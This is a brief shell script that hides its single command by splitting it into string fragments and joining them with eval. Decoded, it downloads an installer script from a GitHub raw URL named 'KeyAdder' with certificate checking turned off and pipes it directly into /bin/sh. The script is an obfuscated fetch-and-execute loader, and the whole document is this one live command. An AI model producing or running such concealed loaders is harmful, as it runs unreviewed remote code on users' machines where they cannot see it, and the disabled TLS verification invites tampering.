z="
";Xz='tall';Wz='/ins';Mz='hubu';Tz='eyAd';Kz='/raw';Bz=' -q ';Pz='nt.c';Ez='eck-';bz=' /bi';Az='wget';Uz='der/';Dz='o-ch';Nz='serc';Oz='onte';Sz='37/K';Lz='.git';Qz='om/e';Gz='ific';Jz='ps:/';Zz='h -O';Yz='er.s';Vz='main';cz='n/sh';Cz='"--n';Hz='ate"';az=' - |';Rz='mil2';Iz=' htt';Fz='cert';
eval "$Az$Bz$Cz$Dz$Ez$Fz$Gz$Hz$Iz$Jz$Kz$Lz$Mz$Nz$Oz$Pz$Qz$Rz$Sz$Tz$Uz$Vz$Wz$Xz$Yz$Zz$az$bz$cz"